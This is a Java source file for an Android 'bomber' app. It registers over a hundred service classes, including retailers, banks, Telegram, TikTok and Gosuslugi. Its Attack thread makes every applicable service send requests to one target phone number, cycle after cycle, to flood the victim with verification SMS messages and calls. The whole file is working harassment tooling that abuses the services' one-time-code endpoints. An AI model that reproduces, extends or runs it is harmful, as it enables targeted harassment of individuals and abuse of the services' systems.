package com.dm.bomber.bomber;

import android.util.Log;

import com.dm.bomber.services.*;

import org.jetbrains.annotations.NotNull;

import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.CountDownLatch;

import okhttp3.Call;
import okhttp3.Response;

public class Bomber {
    private static final String TAG = "Bomber";
    private static final Service[] services = new Service[]{
            new Kari(), new Modulebank(), new YandexEda(),
            new GloriaJeans(), new Telegram(), new MTS(), new CarSmile(),
            new Eldorado(), new Tele2TV(), new MegafonTV(), new YotaTV(),
            new Fivepost(), new FarforCall(), new Sephora(), new Groshivsim(),
            new Ukrzoloto(), new Olltv(), new Wink(), new Lenta(),
            new Pyaterochka(), new ProstoTV(), new Multiplex(), new RendezVous(),
            new Zdravcity(), new Robocredit(), new Tinder(),
            new Hoff(), new Samokat(), new GreenBee(), new Dolyame(),
            new ToGO(), new Premier(), new Gorparkovka(), new Tinkoff(),
            new MegaDisk(), new KazanExpress(), new FoodBand(), new Gosuslugi(),
            new Benzuber(), new Citimobil(), new HHru(), new TikTok(),
            new Ozon(), new MFC(), new EKA(), new OK(), new MBK(),
            new VKWorki(), new Magnit(), new SberZvuk(), new Smotrim(),
            new BApteka(), new HiceBank(), new Evotor(), new Sportmaster(),
            new GoldApple(), new FriendsClub(), new ChestnyZnak(),
            new MoeZdorovie(), new Sokolov(), new Boxberry(), new Discord(),
            new Privileges(), new NearKitchen(), new Citydrive(), new BelkaCar(),
            new Mozen(), new MosMetro(), new BCS(), new Dostavista(),
            new Metro(), new Niyama(), new RabotaRu(), new Sunlight(),
            new Mokka(), new FarforSMS(), new Stolichki(), new Mirkorma(),
            new Uchiru(), new Biua(), new MdFashion(), new RiveGauche(),
            new XtraTV(), new AlloUa(), new Rulybka(), new Velobike(),
            new Technopark(), new Call2Friends(), new Ievaphone(), new WebCom(),
            new MTSBank(), new ATB(), new Paygram(), new Tele2(),
            new SravniMobile(), new Otkritie(), new TeaRU(), new PetStory(),
            new Profi(), new Eleven(), new Apteka(), new TochkaBank(),
            new BeriZaryad(), new PikBroker(), new OneDelivery(), new PrivetMir(),
            new CardsMobile(), new Labirint(), new FixPrice(), new CallMyPhone(),
            new SberMobile(), new YandexTips(), new Meloman(), new Choco(),
            new AptekaOtSklada(), new Dodopizza(), new AutoRu(), new SatUa(),
            new VapeZone(), new TakeEat(), new BibiSushi(), new Melzdrav(),
            new Fonbet(), new Grafkrasnov(), new SixSeasons(), new Stroyudacha(),
            new Grilnica(), new Trapezapizza()
    };

    public static boolean isAlive(Attack attack) {
        return attack != null && attack.isAlive();
    }

    public static List<Service> getUsableServices(String phoneCode) {
        List<Service> usableServices = new ArrayList<>();

        for (Service service : services) {
            if (service.requireCode == null || service.requireCode.equals(phoneCode) || phoneCode.isEmpty())
                usableServices.add(service);
        }

        return usableServices;
    }

    public static class Attack extends Thread {
        private final Callback callback;
        private final String phoneCode;
        private final String phone;
        private final int numberOfCycles;

        private int progress = 0;

        private CountDownLatch tasks;

        public Attack(com.dm.bomber.bomber.Callback callback, String phoneCode, String phone, int cycles) {
            super(phone);

            this.phoneCode = phoneCode;
            this.phone = phone;
            this.callback = callback;

            numberOfCycles = cycles;
        }

        @Override
        public void run() {
            List<Service> usableServices = getUsableServices(phoneCode);

            callback.onAttackStart(usableServices.size(), numberOfCycles);
            Log.i(TAG, String.format("Starting attack on +%s%s", phoneCode, phone));

            try {
                for (int cycle = 0; cycle < numberOfCycles; cycle++) {
                    Log.i(TAG, String.format("Started cycle %s", cycle));

                    tasks = new CountDownLatch(usableServices.size());

                    for (Service service : usableServices) {
                        service.prepare(phoneCode, phone);
                        service.run(new com.dm.bomber.services.Callback() {
                            @Override
                            public void onSuccess() {
                                tasks.countDown();
                                callback.onProgressChange(progress++);
                            }

                            @Override
                            public void onError(Exception e) {
                                Log.e(TAG, String.format("%s returned error", service.getClass().getName()), e);
                                onSuccess();
                            }

                            @Override
                            public void onResponse(@NotNull Call call, @NotNull Response response) {
                                if (!response.isSuccessful()) {
                                    Log.i(TAG, String.format("%s returned an error HTTP code: %s",
                                            service.getClass().getName(), response.code()));
                                }
                                onSuccess();
                            }
                        });
                    }

                    try {
                        tasks.await();
                    } catch (InterruptedException e) {
                        break;
                    }
                }

                callback.onAttackEnd(true);
            } catch (StringIndexOutOfBoundsException e) {
                Log.i(TAG, "Invalid number format");

                callback.onAttackEnd(false);
            } finally {
                Log.i(TAG, String.format("Attack on +%s%s ended", phoneCode, phone));
            }
        }
    }
}